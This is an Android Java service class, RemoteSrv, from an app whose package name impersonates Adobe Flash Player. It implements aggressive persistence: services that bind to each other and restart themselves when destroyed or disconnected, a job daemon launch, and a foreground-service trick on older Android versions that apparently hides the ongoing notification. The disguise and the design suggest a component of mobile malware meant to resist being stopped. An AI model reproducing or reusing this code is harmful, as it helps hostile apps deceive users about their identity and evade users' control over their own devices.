package com.adobe.flashplayer.core;

import android.app.Notification;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.adobe.flashplayer.ISvcAidlInterface;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.Utils;


public class RemoteSrv extends Service {
    private final String TAG = "[ljg]RemoteSrv ";

    private static final int REMOTE_INNNERTHREAD_ID = ForegroundSrv.GRAY_SERVICE_ID + 2;

    private Context context = null;

    public static RemoteSrvConnection conn = null;

    public static RemoteSrvBinder remoteBinder = null;

    ForegroundSrv.ForegroundSrvBinder foreBinder = null;

    @Override
    public IBinder onBind(Intent intent) {
        Log.e(TAG, "onBind");
        MyLog.writeLogFile(TAG+"onBind\r\n");
        return remoteBinder;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.e(TAG, "onUnbind");
        MyLog.writeLogFile(TAG+"onUnbind\r\n");
        System.out.println(TAG+"onUnbind\r\n");
        return super.onUnbind(intent);
    }


    @Override
    public void onCreate() {

        super.onCreate();

        context = getApplicationContext();

        conn = new RemoteSrvConnection();

        remoteBinder = new RemoteSrvBinder();

        Intent intentbind = new Intent(this, ForegroundSrv.class);

        intentbind.setClass(context, ForegroundSrv.class);

        boolean ret = bindService(intentbind, conn, Context.BIND_IMPORTANT);

        Log.e(TAG, "onStartCommand bindService result:" + String.valueOf(ret));

        MyLog.writeLogFile(TAG+"onStartCommand bindService result:" + String.valueOf(ret) + "\r\n");

        CoreHelper.launchJobDeamonService(context);
    }




    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (Build.VERSION.SDK_INT < 18) {
            startForeground(REMOTE_INNNERTHREAD_ID, new Notification());
        }
        else if (Build.VERSION.SDK_INT >= 18 && Build.VERSION.SDK_INT < 24){
            Intent innerIntent = new Intent(context, RemoteInnerSrv.class);
            innerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startService(innerIntent);

        }else{
            ;	//do nothing after android 7.0
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = CoreHelper.createNotificationChannel(this.getClass().getSimpleName(), this.getClass().getSimpleName(),context);
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, channelId);
            Notification notification = builder.setOngoing(true)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setPriority(1)
                    .setCategory(Notification.CATEGORY_SERVICE)
                    .build();
            startForeground(REMOTE_INNNERTHREAD_ID, notification);
        } else {
            //前台服务，优先级和前台应用一个级别，除非在系统内存非常缺，否则此进程不会被 kill
            startForeground(REMOTE_INNNERTHREAD_ID, new Notification());
        }

        return START_STICKY;
    }




    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.e(TAG, "onDestroy");

        Intent intent = new Intent(RemoteSrv.this, RemoteSrv.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startService(intent);

        Intent intentfore = new Intent(RemoteSrv.this, ForegroundSrv.class);
        intentfore.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //startService(intentfore);
        CoreHelper.launchForegroundService(context);
        //do not call unbindService(conn) but call bindService
        boolean ret = bindService(intentfore, conn, Context.BIND_IMPORTANT);

        Log.e(TAG, "onDestroy bindService:" + String.valueOf(ret));
        MyLog.writeLogFile(TAG+"onDestroy bindService:" + String.valueOf(ret) + "\r\n");
    }




    public static class RemoteSrvBinder extends ISvcAidlInterface.Stub {
        @Override
        public String getServiceName() throws RemoteException {
            return RemoteSrv.class.getSimpleName();
        }
    }


    class RemoteSrvConnection implements ServiceConnection {

        private static final String TAG = "[ljg]RemoteSrvConnection ";

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            //foreBinder = (ForegroundSrv.ForegroundSrvBinder)service;
            ISvcAidlInterface proxy = ISvcAidlInterface.Stub.asInterface(service);
            try{
                Log.e(TAG, "run service method result:"  + proxy.getServiceName());

            }catch (Exception e){
                e.printStackTrace();
            }
            Log.e(TAG, "onServiceConnected:"+name);
            MyLog.writeLogFile(TAG+"onServiceConnected:" + name + "\r\n");
        }


        @Override
        public void onServiceDisconnected(ComponentName name) {
            Intent intent = new Intent(RemoteSrv.this, ForegroundSrv.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            //startService(intent);
            CoreHelper.launchForegroundService(context);
            boolean ret = RemoteSrv.this.bindService(intent, conn, Context.BIND_IMPORTANT);
            Log.e(TAG, "onServiceDisconnected bindService:" + name + " result:" + String.valueOf(ret));
            MyLog.writeLogFile(TAG+"onServiceDisconnected bindService:"+ name + " result:" + String.valueOf(ret) + "\r\n");
        }
    }



    //inner service must be public static
    public static class RemoteInnerSrv extends Service{

        private static final String TAG = "[ljg]RemoteInnerServ ";

        public IBinder onBind(Intent intent){
            return null;
        }

        public int onStartCommand(Intent intent, int flags, int startId){
            Log.e(TAG, "onStartCommand");

            MyLog.writeLogFile(TAG+"onStartCommand\r\n");

            startForeground(REMOTE_INNNERTHREAD_ID+1, new Notification());
            //stopForeground(true);
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }

        public void onCreate(){
            super.onCreate();
            Log.e(TAG, "onCreate");
            MyLog.writeLogFile(TAG+"onCreate\r\n");
        }

        public void onDestroy(){
            super.onDestroy();
            Log.e(TAG, "onDestroy");
            MyLog.writeLogFile(TAG+"onDestroy\r\n");
        }
    }




}

